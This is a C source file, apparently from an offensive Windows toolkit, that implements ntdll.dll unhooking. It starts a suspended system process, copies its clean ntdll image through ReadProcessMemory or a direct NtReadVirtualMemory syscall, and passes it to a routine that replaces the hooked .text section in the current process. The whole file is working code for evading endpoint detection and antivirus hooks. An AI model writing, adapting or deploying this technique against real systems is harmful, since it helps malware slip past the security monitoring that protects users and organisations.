#include "unhooking.h"

SIZE_T GetNtdllSizeFromBaseAddress(IN PBYTE pNtdllModule) {

	PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pNtdllModule;
	if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
		return 0;
	
	PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pNtdllModule + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
		return 0;

	return pImgNtHdrs->OptionalHeader.SizeOfImage;
}


BOOL ReadNtdllFromASuspendedProcess(IN PWSTR pwProcessName, OUT PVOID* ppNtdllBuf) {
	WCHAR  wcWinPath[MAX_PATH / 2] = { 0 };
	WCHAR  wcProcessPath[MAX_PATH] = { 0 };

	PVOID  pNtdllModule = FetchLocalNtdllBaseAddress();
	PBYTE  pNtdllBuffer = NULL;
	SIZE_T sNtdllSize = 0, sNumberOfBytesRead = 0;

	STARTUPINFO            Si = { 0 };
	PROCESS_INFORMATION    Pi = { 0 };

	// Cleaning the structs (setting elements values to 0)
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Get the Windows directory
	if (GetWindowsDirectoryW(wcWinPath, MAX_PATH / 2) == 0) {
		DebugPrint("[!] GetWindowsDirectoryW Failed With Error : %d \n", GetLastError());
		goto _EndOfFunc;
	}

	// Construct the process path
	swprintf_s(wcProcessPath, MAX_PATH, L"\\??\\%s\\System32\\%s", wcWinPath, pwProcessName);
	
	WDebugPrint("[i] Running : \"%s\" As A Suspended Process... \n", pwProcessName);

	if (!CreateSuspendedProcess(pwProcessName, &Pi, NULL, NULL)) {
		DebugPrint("[!] CreateSuspendedProcess Failed\n");
		return FALSE;
	}

	// Allocate memory to read ntdll.dll from the remote process
	sNtdllSize = GetNtdllSizeFromBaseAddress((PBYTE)pNtdllModule);
	if (!sNtdllSize) {
		DebugPrint("[!] Failed to get ntdll size from base address.\n");
		goto _EndOfFunc;
	}

	pNtdllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNtdllSize);
	if (!pNtdllBuffer) {
		DebugPrint("[!] HeapAlloc Failed.\n");
		goto _EndOfFunc;
	}
#ifdef SYSCALL_ENABLED
	// Prepare the syscall for NtReadVirtualMemory
	NtReadVirtualMemory_t pNtReadVirtualMemory = (NtReadVirtualMemory_t)PrepareSyscall((char*)("NtReadVirtualMemory"));
	if (!pNtReadVirtualMemory) {
		DebugPrint("[!] Failed to locate NtReadVirtualMemory.\n");
		return FALSE;
	}

	// Read the ntdll.dll module from the suspended process memory
	NTSTATUS STATUS = 0;
	SIZE_T bytesRead = 0;

	STATUS = pNtReadVirtualMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &bytesRead);
	if (!NT_SUCCESS(STATUS) || bytesRead != sNtdllSize) {
		DebugPrint("[!] NtReadVirtualMemory Failed with Status : 0x%X \n", STATUS);
		DebugPrint("[i] Read %llu of %llu Bytes \n", bytesRead, (unsigned long long)sNtdllSize);
		goto _EndOfFunc;
	}

	*ppNtdllBuf = pNtdllBuffer;

	DebugPrint("[+] Successfully read ntdll.dll from the suspended process.\n");

	if (!TerminateProcess(Pi.hProcess, 0)) {
		DebugPrint("[!] Failed to terminate process. Error: %d\n", GetLastError());
	}
	else {
		DebugPrint("[+] Process Terminated Successfully.\n");
	}
#else

	// reading ntdll.dll
	if (!ReadProcessMemory(Pi.hProcess, pNtdllModule, pNtdllBuffer, sNtdllSize, &sNumberOfBytesRead) || sNumberOfBytesRead != sNtdllSize) {
		DebugPrint("[!] ReadProcessMemory Failed with Error : %d \n", GetLastError());
		DebugPrint("[i] Read %d of %d Bytes \n", sNumberOfBytesRead, sNtdllSize);
		goto _EndOfFunc;
	}
#endif

	*ppNtdllBuf = pNtdllBuffer;

	// terminating the process
	if (DebugActiveProcessStop(Pi.dwProcessId) && TerminateProcess(Pi.hProcess, 0)) {
		DebugPrint("[+] Process Terminated \n");
	}

_EndOfFunc:
	if (Pi.hProcess)
		CloseHandle(Pi.hProcess);
	if (Pi.hThread)
		CloseHandle(Pi.hThread);
	if (*ppNtdllBuf == NULL)
		return FALSE;
	else
		return TRUE;

}

BOOL UnhookNtdllTextSectionViaSuspended(IN PWSTR pwProcessName) {

    PVOID pUnhookedNtdll = NULL;

    if (!ReadNtdllFromASuspendedProcess(pwProcessName, &pUnhookedNtdll)) {
        DebugPrint("[!] ReadNtdllFromASuspendedProcess Failed \n");
        return FALSE;
    }

    if (!ReplaceNtdllTxtSection(pUnhookedNtdll)) {
        DebugPrint("[!] ReplaceNtdllTxtSection Failed \n");
        return FALSE;
    }

    HeapFree(GetProcessHeap(), 0, pUnhookedNtdll);

    return TRUE;
}